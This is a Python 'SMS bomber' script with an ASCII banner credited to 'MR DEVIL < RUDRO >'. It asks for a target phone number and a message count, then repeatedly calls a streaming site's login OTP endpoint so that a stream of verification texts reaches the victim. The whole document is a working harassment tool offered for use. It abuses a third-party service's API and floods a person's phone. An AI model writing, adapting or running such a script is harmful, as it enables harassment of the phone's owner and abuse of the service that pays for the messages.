import os
from urllib import request
import time

os.system('clear')

print("""███╗░░░███╗██████╗░  ██████╗░███████╗██╗░░░██╗██╗██╗░░░░░
████╗░████║██╔══██╗  ██╔══██╗██╔════╝██║░░░██║██║██║░░░░░
██╔████╔██║██████╔╝  ██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░
██║╚██╔╝██║██╔══██╗  ██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░
██║░╚═╝░██║██║░░██║  ██████╔╝███████╗░░╚██╔╝░░██║███████╗
╚═╝░░░░░╚═╝╚═╝░░╚═╝  ╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝

★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
NAME : MR DEVIL < RUDRO >
GITHUB : https://github.com/mrdevil420
FACEBOOK : https://www.facebook.com/mr.devil.420x
★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
""")

phone=input("Enter Target Number :")
sms=int(input("Set SMS Limit :"))

url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"

for a in range(sms):
	request.urlopen(url)
	print(str(a+1)+"SMS Sent Successfully")
	time.sleep(30)